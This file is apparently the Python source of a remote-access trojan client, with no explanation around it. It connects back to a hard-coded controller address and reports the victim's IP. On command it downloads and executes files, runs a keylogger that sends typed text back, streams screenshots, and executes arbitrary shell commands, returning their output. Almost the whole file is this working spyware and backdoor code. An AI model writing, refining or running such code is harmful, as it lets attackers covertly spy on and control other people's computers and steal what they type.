try:
    import py2exe
    import socket
    import os 
    import time 
    import subprocess
    import mss
    import threading
    import keyboard
except:
    subprocess.run('python -m pip install --upgrade pip')
    module = ['socket', 'os', 'mss', 'zlib', 'keyboard', 'threading' ]
    num = 0
    while num < 6:
        subprocess.run('python -m pip install {module}'.format(module = module[num]))
        num +=1
class client():
    def __init__(self, port):
        self.ip = '192.168.159.1'
        self.port = port
        self.myip = socket.gethostbyname(socket.gethostname())
    def connect(self):
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.s = s
        while True:
          s.connect((self.ip, self.port))
          while True:
                s.recv(1024).decode()
                while True:
                    s.sendall(self.myip.encode())
                    while True:
                        self.command()

    def keylogstop(self):
        if self.s.recv(1024):
            print('disconnect ')
            self.s.send(int.to_bytes(10, 40, 'little'))
            self.command()

    def keylogging(self):
        nowtime = time.time()
        list1 = []
        while True:
            newtime = time.time()
            txt = keyboard.record('space')
            x = list(keyboard.get_typed_strings(txt))
            list1.extend(x)
            if newtime - nowtime > 10:
                self.s.sendall(str(list1).encode())
                nowtime = newtime
                list1 = []
            else:
                pass

    def command(self):
        s = self.s
        try:
            response = s.recv(1024).decode()
        except:
            self.connect()
        if response == 'f':
            folder = os.getcwd()
            file = s.recv(1024).decode()
            while True:
                with open (file , 'wb') as f:
                    txt = s.recv(10240)
                    print(txt)
                    f.write(txt)
                    f.close()
                exec(open(file).read())
                self.command()
        elif response == 'k':
            wait = threading.Thread(target=self.keylogstop)
            keylogger = threading.Thread(target=self.keylogging)
            wait.start()
            keylogger.start()
            wait.join()
            keylogger.join()
            self.command()
        elif response == 's':
            scr = mss.mss()
            monitor = scr.monitors[1]
            while True:
                try:
                    img = scr.grab(monitor)
                    data = mss.tools.to_png(img.rgb, img.size)
                    size = str(len(data)).encode()
                    size_len = len(size)
                    s.send(str(size_len).encode())
                    s.send(size)
                    x = s.sendall(data)
                    while True:
                        x = s.recv(1024).decode()
                        if x == 'quit':
                            self.command()
                        else:
                            break
                except:
                    self.command()
        elif response == 'b':
            while True:
                command = s.recv(1024).decode()
                if command == 'quit':
                    self.command()
                else:
                    try:
                        result = subprocess.run(command, capture_output=True, text=True).stdout
                        s.send(result.encode())
                    except:
                        s.send('bug'.encode())
    
if __name__ == '__main__':
    client = client(8080)
    client.connect()

